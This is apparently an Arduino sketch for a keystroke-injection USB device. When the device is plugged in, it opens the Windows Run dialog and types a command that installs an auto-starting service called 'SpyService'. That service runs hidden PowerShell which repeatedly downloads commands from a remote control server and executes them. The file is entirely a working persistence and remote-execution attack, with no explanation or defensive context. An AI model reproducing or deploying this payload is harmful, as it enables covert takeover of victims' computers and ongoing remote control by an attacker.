#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("sc create SpyService binPath= \"cmd /c start powershell -WindowStyle Hidden -Command `\"while(1){Start-Sleep 60; Invoke-WebRequest -Uri http://c2.com/command -UseBasicParsing | IEX}`\"\" start= auto"));
}

void loop() {}
